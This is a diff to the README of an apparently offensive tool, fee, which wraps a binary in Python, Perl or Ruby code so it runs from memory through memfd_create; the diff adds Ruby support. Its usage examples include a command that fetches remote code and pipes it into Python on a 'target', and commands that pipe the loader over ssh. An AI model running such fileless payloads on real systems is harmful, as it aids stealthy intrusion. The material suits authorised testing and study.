@@ -11,11 +11,12 @@ The technique used for this is explained [here](https://magisterquis.github.io/2
 
 ### Target requirements
 
- * kernel: 3.17 (for `memfd_create` support)
+ * kernel: 3.17 or later (for `memfd_create` support)
  * An interpreter. Any of these:
    * Python 2
    * Python 3
    * Perl
+   * Ruby
 
 ### Usage
 
@@ -31,19 +32,23 @@ You can then pipe this into Python on the target:
 $ curl my.example.site/output.py | python
 ```
 
-Alternatively, you may generate Perl code instead with the `--lang` flag (`-l`) (requires entering the target architecture manually):
+Alternatively, you may generate Perl or Ruby code instead with the `--lang` flag (`-l`) (requires entering the target architecture manually):
 ```console
 $ ./fee.py /path/to/binary -l pl -t amd64 | perl
 ```
 
-If you want to pipe over ssh, use the `--with-command` flag (`-c`) to wrap the output in `python -c` (or `perl -e` accordingly):
+```console
+$ ./fee.py /path/to/binary -l rb -t amd64 | ruby
+```
+
+If you want to pipe over ssh, use the `--with-command` flag (`-c`) to wrap the output in `python -c` (or `perl -e`, `ruby -e` accordingly):
 
 ```console
 $ ./fee.py -c /path/to/binary | ssh user@target
 ``` 
 
 When piping over ssh, you sometimes want to wrap the long line which holds the base64-encoded version of the binary, as some shells do not like super long input strings. You can accomplish this with the `--wrap` flag (`-w`):
-```
+```console
 $ ./fee.py -c /path/to/binary -w 64 | ssh user@target
 ```
 
